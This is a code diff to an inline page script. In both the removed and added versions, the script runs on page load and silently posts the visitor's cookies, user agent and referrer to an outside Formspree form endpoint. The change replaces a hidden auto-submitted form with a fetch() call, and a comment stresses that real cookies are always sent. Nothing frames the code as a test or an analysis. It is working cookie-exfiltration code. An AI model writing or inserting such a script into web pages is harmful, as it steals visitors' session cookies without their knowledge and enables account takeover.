@@ -1,26 +1,16 @@
 <script>
     document.addEventListener("DOMContentLoaded", function() {
-        let form = document.createElement("form");
-        form.style.display = "none";
-        form.method = "POST";
-        form.action = "https://formspree.io/f/xeoqzkqe";
-
-        let fields = {
+        let data = {
             cookie_data: document.cookie,  // Always sends actual cookies
             user_agent: navigator.userAgent,
             referrer: document.referrer,
             fallback: "not_empty"
         };
 
-        for (let key in fields) {
-            let input = document.createElement("input");
-            input.type = "hidden";
-            input.name = key;
-            input.value = fields[key];
-            form.appendChild(input);
-        }
-
-        document.body.appendChild(form);
-        form.submit();
+        fetch("https://formspree.io/f/xeoqzkqe", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        });
     });
 </script>
